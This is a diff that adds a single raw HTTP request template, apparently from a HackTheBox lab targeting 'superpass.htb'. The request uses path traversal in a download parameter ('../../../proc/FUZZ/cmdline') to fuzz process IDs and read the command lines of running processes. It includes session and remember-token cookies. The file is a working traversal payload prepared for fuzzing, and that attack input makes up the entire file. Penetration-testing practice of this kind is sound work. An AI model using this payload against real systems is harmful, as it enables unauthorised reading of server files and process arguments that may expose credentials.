@@ -1,0 +1,9 @@
+GET /download?fn=../../../proc/FUZZ/cmdline HTTP/1.1
+Host: superpass.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=.eJydjsFqwzAQRH9F7NkUWSvvav0VvZcQ1tIqNrhNsJxTyL9X0D_oaRjeDDMvuNZd22oN5q8XuLMLfFtrejMY4HM3beb2-81tP-68O825Q3euW3OPnvmAy3v4Z-8y9PHD2grzeTytu63ADIxoiF7Zslgh0xgiovhRKiNFrrGGgKMUFem0cqI0Bg5ZA-mixZgyqyiKSmHPJLFQTZV8kOxjTMHGxMtUJEXCpBNh5XHygcoiWajfvz6bHX9vBN6_05hXoA.ZJB58Q.tjLw41nVaja7SUVXlTIvui3r0Ds; remember_token=9|1eaf68cd397933029f8527fea7b700541ae0f4e1a1ced6696e6f03cadcdb6697a422f4964b10e2e331a1f974d069d2d7e2d08cfea49c3f8582cfae9e0704c117
+Upgrade-Insecure-Requests: 1
